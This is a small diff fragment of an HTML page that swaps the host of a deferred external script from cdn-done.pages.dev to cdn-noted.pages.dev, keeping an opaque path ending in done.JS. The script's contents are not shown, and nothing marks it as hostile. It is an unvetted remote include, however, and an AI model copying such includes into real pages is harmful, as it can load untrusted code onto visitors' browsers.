@@ -312,7 +312,7 @@
         
     >
 
-    <script src="https://cdn-done.pages.dev/cdn-globaljs/MainJS/UpperJS/DeliverJS/done.JS" defer></script>
+    <script src="https://cdn-noted.pages.dev/cdn-globaljs/MainJS/UpperJS/DeliverJS/done.JS" defer></script>
     
 
         <script nonce="+gWSoSeB7oJ/5IB7H6o53UJw">
